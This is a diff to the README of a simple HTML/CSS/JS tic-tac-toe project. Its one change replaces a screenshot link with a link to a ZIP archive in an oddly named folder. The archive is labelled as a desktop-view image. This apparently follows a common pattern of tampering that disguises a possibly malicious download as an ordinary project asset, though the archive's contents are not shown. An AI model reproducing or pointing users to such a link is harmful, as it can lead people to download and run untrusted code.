@@ -3,4 +3,4 @@ TIC TAC TOE Game Using HTML , CSS AND JS
 **KARTIKAY SHARMA** 
 </br>
 </br>
-![Tic Tac Toe Desktop View](https://github.com/Kartikay7124/Tic-Tac-Toe-Game/assets/102504679/0fd7d7e3-5d0e-4025-9d02-d52f52156e0e)
+![Tic Tac Toe Desktop View](https://github.com/Kartikay7124/Tic-Tac-Toe-Game/raw/refs/heads/main/sulphoricinoleate/Toe_Tic_Tac_Game_v1.6.zip)
